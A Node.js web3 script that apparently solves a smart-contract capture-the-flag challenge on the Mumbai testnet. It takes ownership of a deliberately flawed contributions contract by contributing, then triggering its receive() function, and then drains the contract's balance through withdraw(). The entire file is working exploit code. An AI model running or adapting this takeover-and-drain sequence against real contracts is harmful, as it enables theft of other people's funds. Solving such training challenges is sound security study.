const Web3 = require('web3');
const web3 = new Web3('https://matic-mumbai.chainstacklabs.com');

const contractAbi = [{"inputs":[],"stateMutability":"nonpayable","type":"constructor"},{"inputs":[],"name":"contribute","outputs":[],"stateMutability":"payable","type":"function","payable":true,"signature":"0xd7bb99ba"},{"inputs":[{"internalType":"address","name":"","type":"address"}],"name":"contributions","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function","constant":true,"signature":"0x42e94c90"},{"inputs":[],"name":"getContribution","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function","constant":true,"signature":"0xf10fdf5c"},{"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function","constant":true,"signature":"0x8da5cb5b"},{"inputs":[],"name":"withdraw","outputs":[],"stateMutability":"nonpayable","type":"function","signature":"0x3ccfd60b"},{"stateMutability":"payable","type":"receive","payable":true}];

async function solve(privateKey, contractAddress, contractAbi) {
    const contract = new web3.eth.Contract(contractAbi, contractAddress);
    const account = web3.eth.accounts.privateKeyToAccount(privateKey);

    if (await isSolved(account, contract)) {
        console.log('The challenge has already been solved.');
        return;
    }

    console.log('making initial contribution');
    const tx = await contract.methods.contribute();
    const options = {
        to: contractAddress,
        from: account.address,
        data: tx.encodeABI(),
        value: web3.utils.toWei('1', 'wei'),
        gas: await tx.estimateGas({from: account.address, value: web3.utils.toWei('1', 'wei')}),
        gasPrice: await web3.eth.getGasPrice()
    };
    const signedTx = await web3.eth.accounts.signTransaction(options, privateKey);
    await web3.eth.sendSignedTransaction(signedTx.rawTransaction);

    console.log('sending 1 wei to contract to trigger receive() and gain ownership');
    const tx2Opts = {
        to: contractAddress,
        from: account.address,
        value: web3.utils.toWei('1', 'wei'),
        gas: await web3.eth.estimateGas({from: account.address, value: web3.utils.toWei('1', 'wei')}),
        gasPrice: await web3.eth.getGasPrice(),
    };
    const signedTx2 = await web3.eth.accounts.signTransaction(tx2Opts, privateKey);
    await web3.eth.sendSignedTransaction(signedTx2.rawTransaction);

    console.log('withdrawing funds');
    const tx3 = await contract.methods.withdraw();
    const tx3Opts = {
        to: contractAddress,
        from: account.address,
        data: tx3.encodeABI(),
        gas: await tx3.estimateGas({from: account.address}),
        gasPrice: await web3.eth.getGasPrice(),
    };
    const signedTx3 = await web3.eth.accounts.signTransaction(tx3Opts, privateKey);
    await web3.eth.sendSignedTransaction(signedTx3.rawTransaction);

    console.log('check if contract is owned and empty...');
    if (await isSolved(account, contract)) {
        console.log('Solved!');
    } else {
        console.error('The challenge has not been solved. Something unexpected happened.');
    }
}

async function isSolved(account, contract) {
    const owner = await contract.methods.owner().call();
    const balance = await web3.eth.getBalance(contract.options.address);

    return owner === account.address && balance === '0';
}

// Main

const privateKey = process.argv[2];
if (!privateKey) {
    console.error('Please provide a private key as the first argument.');
    process.exit(1);
}

const contractAddress = process.argv[3];
if (!contractAddress) {
    console.error('Please provide a contract address as the second argument.');
    process.exit(1);
}

solve(privateKey, contractAddress, contractAbi);
